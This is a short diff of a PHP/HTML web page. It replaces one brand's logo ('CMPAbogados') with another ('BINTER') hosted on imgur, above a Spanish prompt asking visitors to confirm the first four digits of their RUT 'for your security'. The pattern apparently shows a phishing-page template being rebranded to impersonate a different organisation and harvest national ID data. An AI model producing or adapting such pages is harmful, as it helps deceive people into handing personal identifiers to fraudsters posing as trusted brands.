@@ -55,7 +55,7 @@ $enddate=strtotime("+5 days", $startdate);
         <div class="opaco"></div>
 
         <div class="content container-fluid d-flex flex-column align-items-center justify-content-start p-0">
-            <img style="max-width:350px; max-height:250px" class="img-fluid col-10 col-md-3 mt-4" src="blob:https://web.whatsapp.com/6ab9f5b1-6dff-455c-a40b-483136d042a5" alt="CMPAbogados">
+            <img style="max-width:350px; max-height:250px" class="img-fluid col-10 col-md-3 mt-4" src="https://i.imgur.com/jXMebWV.jpg" alt="BINTER">
 
              <div id="cont1" class="p-5 ">
                 <h4 class="text-black text-center">Por tu seguridad, confírmanos los primeros 4 dígitos de tu RUT</h4>
